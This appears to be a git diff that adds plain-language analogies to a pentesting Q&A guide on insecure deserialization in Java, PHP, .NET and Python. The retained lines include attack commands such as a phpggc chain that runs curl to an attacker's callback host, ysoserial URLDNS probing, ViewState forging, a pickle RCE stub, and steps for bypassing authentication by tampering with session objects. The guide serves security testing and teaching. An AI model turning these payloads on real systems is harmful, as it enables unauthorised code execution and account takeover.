@@ -36,6 +36,11 @@
 # LEVEL 0 — FUNDAMENTALS
 
 ### Q1. What is insecure deserialization?
+
+> *Plain version:* serializing = flat-packing an object into a box with an assembly card; deserializing = a worker who
+> builds whatever the card says. Insecure deserialization is when **you get to write the card** and the worker obeys a
+> step that says "run this command." You supply the object; the app's own code executes on rebuild.
+
 A vulnerability where an app **turns attacker-controlled bytes back into objects** with a deserializer that runs code
 during reconstruction. By crafting the serialized data, you control **which code executes** — typically reaching
 **Remote Code Execution**. It's **CWE-502**, OWASP **A08:2021**.
@@ -52,6 +57,11 @@ already-loaded library classes — links those hooks to a sink like `Runtime.exe
 data; the app's own classes do the execution.
 
 ### Q4. What is a "gadget chain"?
+
+> *Plain version:* you don't bring your own code — you build a **Rube Goldberg machine out of parts already in the
+> factory**. Each "gadget" is a method that already exists in a loaded library; the chain wires them so that innocent
+> step 1 pulls step 2 pulls step 3… until the last one runs a command. ysoserial/PHPGGC ship these machines pre-built.
+
 A chain of existing classes/methods (in the app or its libraries) that, when triggered during deserialization, performs
 something dangerous. You don't inject code — you **re-purpose code already present** (Property-Oriented Programming). Tools
 like ysoserial/PHPGGC ship ready-made chains for common libraries.
@@ -72,6 +82,11 @@ read/write** (phar/gadget), **DoS** (expansion). The primitive ("app deserialize
 depends on the language, the classpath/gadgets, and whether the blob is integrity-protected.
 
 ### Q8. What's the first thing I do with a suspicious blob?
+
+> *Plain version:* read the "made by" stamp on the front before doing anything else. That one prefix tells you which
+> country the package came from — and therefore which tool, gadgets, and magic methods apply. Guess the language wrong
+> and every later payload is aimed at the wrong door.
+
 **Recognize the format/language** from its signature (`rO0`/`O:`/`AAEAAAD`/`\x80`/`\x04\x08`/`_$$ND_FUNC$$_`). That single
 step decides everything: which tool, which gadgets, which magic methods. `poc/deser_detect.py` automates it.
 
@@ -141,6 +156,11 @@ A confident **language + deserializer** identification for the blob, and a note 
 reconstructs it as an object. A trace naming `ObjectInputStream`/`unserialize`/`BinaryFormatter`/`pickle` confirms sink + language.
 
 ### Q22. What is URLDNS and why use it first?
+
+> *Plain version:* URLDNS is the doorbell. It's a harmless Java object whose only behavior on rebuild is to look up a
+> DNS name — **no command runs, no special library needed**. If your listener sees the DNS ping, the sink is live and
+> you've proven it with zero risk. Always ring the doorbell before you try kicking the door in with an RCE chain.
+
 `ysoserial URLDNS "http://token.YOUR-OOB"` builds a Java object that performs a **DNS lookup on deserialization** — **no
 code execution and no gadget-library dependency**. A DNS hit to your listener **confirms deserialization cleanly and
 safely**. Always do this (or a per-language callback) before firing an RCE chain.
@@ -182,6 +202,11 @@ that proves the severity you're claiming.
 Commons Collections**). ysoserial generates the object; the app's libraries execute the command during reconstruction.
 
 ### Q30. Why is the gadget chain classpath-dependent?
+
+> *Plain version:* your Rube Goldberg machine is built from *specific* parts. If the target doesn't have that library
+> installed, the parts aren't there and the machine collapses. So you first **check which parts are on the shelf**
+> (GadgetProbe fingerprints the classpath), then pick the one chain whose parts you know are present — don't spray.
+
 Because the chain re-uses **specific library classes** (CommonsCollections, Spring, Groovy, ROME…). If that library
 isn't loaded, the chain fails. So you must know **which libraries are present** — use **GadgetProbe** to fingerprint the
 classpath, then pick the matching ysoserial chain.
@@ -242,6 +267,11 @@ often work independent of the CC-style classpath.
 # LEVEL 4 — PHP (unserialize, POP, phar)
 
 ### Q41. What is PHP Object Injection?
+
+> *Plain version:* PHP's serialized text spells everything out (`O:4:"User":2:{…}`), so you can craft or edit an object
+> by hand and feed it to `unserialize()`. When PHP rebuilds it, the object's automatic "magic methods" fire — and a POP
+> chain rides those magic methods across the app's classes until one reaches `system()`.
+
 Passing a serialized **object** to `unserialize()` on user input. During reconstruction/cleanup, the object's **magic
 methods** (`__wakeup`/`__destruct`/`__toString`) run — and a **POP chain** across the app's classes can reach a dangerous
 sink (`system`, `file_put_contents`, SQL) → RCE, or you tamper properties for auth bypass.
@@ -259,6 +289,11 @@ phpggc Laravel/RCE1 system 'curl http://YOUR-OOB/p'   # serialized string for un
 Inject the output into the `unserialize()` sink (cookie/param). Match the chain to the framework the app uses.
 
 ### Q44. What is phar deserialization and why is it huge?
+
+> *Plain version:* the shocker — you **don't need an `unserialize()` call at all**. A Phar file hides a serialized
+> object in its metadata, and *any* file operation on a `phar://` path (even `file_exists`) quietly unpacks it. So an app
+> that never deserializes user input is still exploitable the moment you control a file path it touches.
+
 A **Phar** archive stores serialized **metadata**. Any PHP **file operation** on a `phar://` path — `file_exists`,
 `fopen`, `getimagesize`, `md5_file`, `is_dir`, `include`… — **deserializes that metadata** with **no `unserialize()`
 call**. So even apps that never call `unserialize()` on input are exploitable if you control a file path.
@@ -315,6 +350,11 @@ Drop the base64 into the sink. Pick the `-f` formatter to match the target and `
 ObjectDataProvider, WindowsIdentity, DataSet…).
 
 ### Q55. Walk me through ViewState RCE.
+
+> *Plain version:* that giant `__VIEWSTATE` blob on classic ASP.NET pages is a serialized object the page rebuilds every
+> postback. If the site didn't sign it (**MAC off**), you swap it for an RCE gadget → **unauthenticated** code exec. If
+> it *is* signed, you need the secret **machineKey** — which is why XXE/LFI to read `web.config` is the usual setup move.
+
 `__VIEWSTATE` is a serialized object. If **`EnableViewStateMac=false`** (no integrity), forge a malicious ViewState with
 `ysoserial.net -p ViewState` → **unauthenticated RCE**. If MAC is on, you need the **`machineKey`** (validationKey) —
 often leaked in `web.config` (read it via **XXE/LFI**) or a known Telerik/default key.
@@ -358,6 +398,11 @@ note whether it required a leaked key or none (no-key = higher).
 # LEVEL 6 — PYTHON, RUBY, NODE
 
 ### Q63. Why is Python pickle the easiest RCE?
+
+> *Plain version:* pickle lets an object ship its own "how to rebuild me" recipe via `__reduce__`, and the recipe is
+> literally *"call this function with these arguments."* Point the function at `os.system` and you have instant RCE — no
+> gadget hunting at all. That's why loading any untrusted pickle (including ML model files) is game over.
+
 `__reduce__` lets an object declare a **callable + args** that `pickle.loads` executes on load:
 ```python
 class E:
@@ -418,6 +463,11 @@ source** (PHP/Java) if you have code; (3) report the **confirmed primitive** (UR
 deserialization of untrusted data" is a real finding even before a working RCE chain.
 
 ### Q74. How does object tampering give auth bypass?
+
+> *Plain version:* sometimes you don't need RCE at all. If the blob the server trusts *is* your identity card and it
+> isn't signed, just **edit the card** — flip `isAdmin` to true or change the `userId` to someone else's — and hand it
+> back. No gadget, no command; the app simply believes the rebuilt object.
+
 If the serialized blob **is** the session/user state (unsigned), edit `isAdmin:false→true`, `role:user→admin`, or the
 `userId` to another user, re-encode, and send it back. The app trusts the reconstructed object → privesc/impersonation.
 No code execution required.
@@ -539,6 +589,11 @@ Deserialization → DoS only                                   Medium
 ```
 
 ### Q96. What are the most common false positives?
+
+> *Plain version:* "I found a serialized blob" is a *lead*, not a finding. The four traps: recognizing the format isn't
+> exploiting it; a tamper-error proves parsing but not code exec; a signed/MAC'd blob you can't forge is a dead end; and
+> a DNS ping confirms deserialization but is **not** RCE — don't label it as such.
+
 - "This base64 decodes to a serialized object" (recognition ≠ exploitable).
 - A deserialization **error** on tamper with no callback/RCE shown.
 - The blob is **MAC'd/signed** and you lack the key.
